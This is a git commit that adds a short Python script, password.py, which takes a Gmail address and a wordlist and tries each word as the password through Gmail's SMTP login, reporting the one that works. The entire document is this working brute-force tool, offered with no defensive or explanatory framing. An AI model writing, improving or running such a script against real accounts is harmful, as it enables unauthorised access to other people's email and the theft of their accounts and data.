f4c376db9c49124bdcaa2508b6ae77104be316a8
Nipa-Code <60810623+Nipa-Code@users.noreply.github.com>
2020-11-30 21:45:24 +0200

    Add files via upload

---
+++ password.py
@@ -0,0 +1,26 @@
+import smtplib 
+import sys 
+
+user = str(sys.argv[1])
+passwdfile = str(sys.argv[2])
+
+server = 'smtp.gmail.com' 
+port = 587 
+
+smtp = smtplib.SMTP(server, port) 
+smtp.ehlo() 
+smtp.starttls() 
+
+def connect(user, passwd): 
+    try: 
+        smtp.login(user, passwd) 
+        print('[*] Password found: %s' % (passwd)) 
+        sys.exit()
+        
+    except: 
+        print('[*] Attempting password %s ' % (passwd)) 
+
+file = open(passwdfile, 'r') 
+
+for word in file: 
+    connect(user, word)
